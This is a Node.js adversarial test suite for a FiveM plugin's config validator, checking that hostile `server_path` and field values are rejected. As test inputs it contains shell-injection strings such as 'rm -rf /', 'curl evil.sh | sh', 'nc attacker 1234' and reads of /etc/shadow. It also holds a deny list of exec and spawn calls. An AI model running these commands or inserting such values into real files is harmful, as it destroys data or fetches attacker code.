/**
 * Adversarial tests for the `.claude/fivem.local.md` reader.
 *
 * This file lives in the workspace, so a cloned FiveM repository can ship one, and every
 * hook in the plugin reads it. These tests exist to prove a hostile file cannot smuggle a
 * value through to a consumer.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import {
  readConfig,
  validate,
  validateServerPath,
  renderConfig,
  configPath,
  DIALECTS,
} from '../../scripts/fivem-config.mjs';

/** Build a throwaway project dir containing `.claude/fivem.local.md`. */
function project(contents) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fivem-cfg-'));
  fs.mkdirSync(path.join(dir, '.claude'), { recursive: true });
  if (contents !== undefined) fs.writeFileSync(configPath(dir), contents);
  return dir;
}

/** A directory that looks like a real FiveM server, for the positive path. */
function serverDir() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fivem-srv-'));
  fs.mkdirSync(path.join(dir, 'resources'), { recursive: true });
  return dir;
}

describe('server_path is treated as hostile input', () => {
  const injections = [
    '/tmp/x; rm -rf /',
    '/tmp/x && curl evil.sh | sh',
    '/tmp/x | nc attacker 1234',
    '/tmp/x`whoami`',
    '/tmp/x$(whoami)',
    '/tmp/x${IFS}evil',
    '/tmp/x > /etc/passwd',
    '/tmp/x < /etc/shadow',
    '"/tmp/x"; evil',
    "'/tmp/x'; evil",
  ];

  for (const value of injections) {
    test(`rejects ${JSON.stringify(value)}`, () => {
      const warnings = [];
      assert.equal(validateServerPath(value, warnings, { checkExists: false }), null);
      assert.ok(warnings.length > 0, 'must explain why it was dropped');
    });
  }

  test('rejects embedded newline (command on a second line)', () => {
    assert.equal(validateServerPath('/tmp/x\nrm -rf /', [], { checkExists: false }), null);
  });

  test('rejects control characters', () => {
    assert.equal(validateServerPath('/tmp/\u0000evil', [], { checkExists: false }), null);
    assert.equal(validateServerPath('/tmp/\u001Bevil', [], { checkExists: false }), null);
  });

  test('rejects a relative path', () => {
    assert.equal(validateServerPath('../../etc', [], { checkExists: false }), null);
    assert.equal(validateServerPath('resources', [], { checkExists: false }), null);
  });

  test('rejects a path that does not exist', () => {
    assert.equal(validateServerPath(path.join(os.tmpdir(), 'definitely-not-here-xyz'), []), null);
  });

  test('rejects a real directory with no resources/ folder', () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'fivem-nores-'));
    assert.equal(validateServerPath(dir, []), null);
  });

  test('accepts a real server directory', () => {
    const dir = serverDir();
    assert.equal(validateServerPath(dir, []), path.resolve(dir));
  });

  test('accepts a path containing spaces — Windows paths have them', () => {
    const base = fs.mkdtempSync(path.join(os.tmpdir(), 'fivem-sp-'));
    const dir = path.join(base, 'Program Files', 'FXServer');
    fs.mkdirSync(path.join(dir, 'resources'), { recursive: true });
    assert.equal(validateServerPath(dir, []), path.resolve(dir));
  });
});

describe('field validation', () => {
  test('dialect must be in the allow-list', () => {
    for (const d of DIALECTS) {
      assert.equal(validate({ dialect: d }, { checkExists: false }).config.dialect, d);
    }
    const { config, warnings } = validate({ dialect: 'evil' }, { checkExists: false });
    assert.equal(config.dialect, null);
    assert.ok(warnings.some((w) => w.includes('dialect')));
  });

  test('framework/lib must be plain identifiers', () => {
    assert.equal(validate({ framework: 'ox_core' }, { checkExists: false }).config.framework, 'ox_core');
    assert.equal(validate({ framework: 'a; rm -rf /' }, { checkExists: false }).config.framework, null);
    assert.equal(validate({ lib: '$(whoami)' }, { checkExists: false }).config.lib, null);
  });

  test('booleans accept the documented spellings and reject junk', () => {
    for (const v of ['true', 'yes', 'on', '1']) {
      assert.equal(validate({ audit_on_write: v }, { checkExists: false }).config.auditOnWrite, true);
    }
    for (const v of ['false', 'no', 'off', '0']) {
      assert.equal(validate({ audit_on_write: v }, { checkExists: false }).config.auditOnWrite, false);
    }
    const { config, warnings } = validate({ audit_on_write: 'maybe' }, { checkExists: false });
    assert.equal(config.auditOnWrite, true, 'falls back to the default');
    assert.ok(warnings.some((w) => w.includes('audit_on_write')));
  });

  test('unknown keys are dropped, not passed through', () => {
    const { config, warnings } = validate(
      { server_path: '/x', evil_key: 'payload', __proto__: 'x' },
      { checkExists: false }
    );
    assert.equal(config.evil_key, undefined);
    assert.ok(warnings.some((w) => w.includes('unknown key')));
  });

  test('defaults are safe when the file is minimal', () => {
    const { config } = validate({}, { checkExists: false });
    assert.equal(config.enabled, true);
    assert.equal(config.dialect, null);
    assert.equal(config.serverPath, null);
    assert.equal(config.beads, 'auto');
  });
});

describe('file parsing', () => {
  test('missing file is silent and not ok', () => {
    const r = readConfig(project(undefined));
    assert.equal(r.found, false);
    assert.equal(r.ok, false);
    assert.deepEqual(r.warnings, []);
  });

  test('no frontmatter is rejected', () => {
    const r = readConfig(project('just some markdown\n'));
    assert.equal(r.ok, false);
    assert.ok(r.warnings.some((w) => w.includes('frontmatter')));
  });

  test('enabled: false means behave as unconfigured', () => {
    const r = readConfig(project('---\nenabled: false\ndialect: ox\n---\n'));
    assert.equal(r.found, true);
    assert.equal(r.ok, false);
  });

  test('a --- inside the body cannot reopen the frontmatter', () => {
    const dir = project('---\ndialect: ox\n---\n\nbody text\n\n---\ndialect: esx\n---\n');
    const r = readConfig(dir);
    assert.equal(r.config.dialect, 'ox', 'second block must be ignored');
  });

  test('indented / nested YAML is refused rather than interpreted', () => {
    const r = readConfig(project('---\ndialect: ox\nnested:\n  evil: payload\n---\n'));
    assert.equal(r.config.dialect, 'ox');
    assert.ok(r.warnings.some((w) => w.includes('nested') || w.includes('unknown key')));
  });

  test('flow sequences and block scalars are refused', () => {
    const r = readConfig(project('---\nframework: [a, b]\nlib: |\n---\n'));
    assert.equal(r.config.framework, null);
    assert.equal(r.config.lib, null);
  });

  test('an oversized file is ignored rather than parsed', () => {
    const big = '---\ndialect: ox\n---\n' + 'x'.repeat(70 * 1024);
    const r = readConfig(project(big));
    assert.equal(r.ok, false);
    assert.ok(r.warnings.some((w) => w.includes('exceeds')));
  });

  test('a valid file round-trips through render and read', () => {
    const srv = serverDir();
    const dir = project(renderConfig({ dialect: 'ox', framework: 'ox_core', server_path: srv }));
    const r = readConfig(dir);
    assert.equal(r.ok, true);
    assert.equal(r.config.dialect, 'ox');
    assert.equal(r.config.framework, 'ox_core');
    assert.equal(r.config.serverPath, path.resolve(srv));
  });

  test('a hostile file yields no usable server path', () => {
    const dir = project('---\nenabled: true\nserver_path: "/tmp/x; curl evil.sh | sh"\ndialect: ox\n---\n');
    const r = readConfig(dir);
    assert.equal(r.config.serverPath, null, 'injection must not survive');
    assert.equal(r.config.dialect, 'ox', 'valid siblings still parse');
  });
});

describe('the module never builds a shell command', () => {
  test('source contains no exec/spawn/shell construction', () => {
    const src = fs.readFileSync(new URL('../../scripts/fivem-config.mjs', import.meta.url), 'utf8');
    for (const forbidden of ['child_process', 'execSync', 'exec(', 'spawnSync', 'shell:']) {
      assert.ok(!src.includes(forbidden), `must not reference ${forbidden}`);
    }
  });
});
